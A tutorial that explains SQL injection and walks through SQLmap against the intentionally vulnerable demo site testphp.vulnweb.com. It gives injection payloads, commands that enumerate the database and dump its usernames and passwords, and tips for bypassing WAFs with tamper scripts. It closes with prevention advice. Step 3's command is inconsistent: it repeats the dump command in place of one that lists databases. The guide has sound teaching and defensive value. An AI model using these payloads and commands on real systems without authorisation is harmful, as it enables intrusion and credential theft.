## What is SQL Injection?

SQL injection (SQLi) is a critical web security vulnerability that allows attackers to manipulate an application's database queries. By injecting malicious SQL code into input fields, attackers can access unauthorized data, such as user credentials or sensitive information, modify or delete database contents, or even compromise the underlying server. This vulnerability has been the cause of numerous high-profile data breaches, leading to significant reputational and financial damage.

### How SQL Injection Works
SQL injection occurs when user input is improperly sanitized and directly included in SQL queries. For instance, consider a web application querying a product database:

sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1


If an attacker inputs ' OR '1'='1 as the category, the query becomes:

sql
SELECT * FROM products WHERE category = '' OR '1'='1' AND released = 1


This returns all products since '1'='1' is always true, bypassing intended restrictions.

Common SQL injection types include:
- *Retrieving Hidden Data*: Modifying queries to access unauthorized data.
- *Subverting Application Logic*: Bypassing authentication (e.g., ' OR '1'='1' --).
- *UNION Attacks*: Extracting data from other tables using the UNION operator.
- *Blind SQL Injection*: Inferring data through boolean or time-based techniques without direct output.

To detect SQL injection, test inputs with single quotes ('), boolean conditions (e.g., 1=1), or time-delay payloads (e.g., SLEEP(5)).

## Introduction to SQLmap

SQLmap is an open-source penetration testing tool designed to automate the detection and exploitation of SQL injection vulnerabilities in web applications. It supports a wide range of database management systems (DBMS) and offers robust features for database enumeration, data extraction, and advanced exploitation.

### Key Features
- Automated detection and exploitation of SQL injection vulnerabilities.
- Enumeration of databases, tables, columns, and data.
- Support for multiple injection techniques (boolean-based blind, time-based blind, UNION query, etc.).
- Customizable detection levels and risk settings.
- Tampering scripts to bypass web application firewalls (WAFs).
- REST-JSON API for integration and automation.

### Installation
On Kali Linux (recommended for penetration testing), install SQLmap with:

```bash
sudo apt install sqlmap
```

Alternatively, clone the repository from GitHub and run it with Python:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py
```



For basic usage, use sqlmap -u <URL> to test a URL, with flags like --dbs to list databases or --dump to extract data.

*Note*: This guide uses the test site http://testphp.vulnweb.com for demonstration. Always obtain permission before testing systems, as unauthorized scanning is illegal.

## Step-by-Step Guide to Using SQLmap

This guide provides a structured approach to detecting and exploiting SQL injection vulnerabilities using SQLmap, based on a practical demonstration.

### Step 1: Running SQLmap on the Vulnerable Endpoint
Target a potentially vulnerable endpoint, such as:

```bash
http://testphp.vulnweb.com/artists.php?artist=1
```

Run SQLmap to check for vulnerabilities:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch
```



- -u: Specifies the target URL.
- --batch: Automatically selects default options for non-interactive execution.

SQLmap probes the URL's parameters (e.g., artist) to identify injection points.

### Step 2: Detecting the Vulnerability
SQLmap tests various payloads and reports injectable parameters. Example output:

bash
[INFO] sqlmap found the following injection point(s) from stored session:
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 5105=5105


This confirms a boolean-based blind SQL injection in the artist parameter. The payload 1 AND 5105=5105 evaluates to true, verifying the injection point.

### Step 3: Enumerating Databases
List available databases:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname,pass --dump --batch
```




Example output:

bash
[INFO] available databases:
[*] acuart
[*] information_schema


Focus on the application-specific database, acuart.

### Step 4: Listing Tables in a Database
Enumerate tables in the acuart database:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
```



Example output:

Example output:

```bash
Database: acuart
[8 tables]

+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```



The users table is a likely target for sensitive data.

### Step 5: Listing Columns in a Table
Retrieve columns from the users table:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
```



Example output:

bash
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+


Columns like uname (username) and pass (password) are of interest.

### Step 6: Dumping Data from a Table
Extract data from specific columns:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname,pass --dump --batch
```



Example output:

bash
Table: users
[1 entry]
+-------+------+
| uname | pass |
+-------+------+
| test  | test |
+-------+------+


This retrieves usernames and passwords from the users table.

### Advanced Tips
- Adjust detection intensity with --level (1-5) and --risk (1-3).
- Use --tamper scripts (e.g., --tamper=space2comment) to bypass WAFs.
- Enable --threads for faster execution on multi-core systems.
- Check SQLmap logs (~/.sqlmap/output/) for detailed exploitation details.
- Use --sql-shell for an interactive SQL prompt on vulnerable systems.

## Preventing SQL Injection
Securing applications against SQL injection is critical. Key prevention strategies include:

- *Prepared Statements and Parameterized Queries*: Use parameterized queries to separate user input from SQL code.
- *Input Validation and Sanitization*: Validate and escape all user inputs against expected formats.
- *Least Privilege Principle*: Restrict database accounts to minimal permissions.
- *Error Handling*: Suppress detailed error messages that expose database details.
- *Web Application Firewalls (WAFs)*: Deploy WAFs to filter malicious inputs.
- *Stored Procedures*: Use pre-compiled SQL statements to limit injection risks.
- *Regular Security Testing*: Integrate tools like SQLmap into development pipelines.

## Conclusion
SQLmap is a powerful tool for identifying and exploiting SQL injection vulnerabilities, making it invaluable for ethical hackers and security professionals.
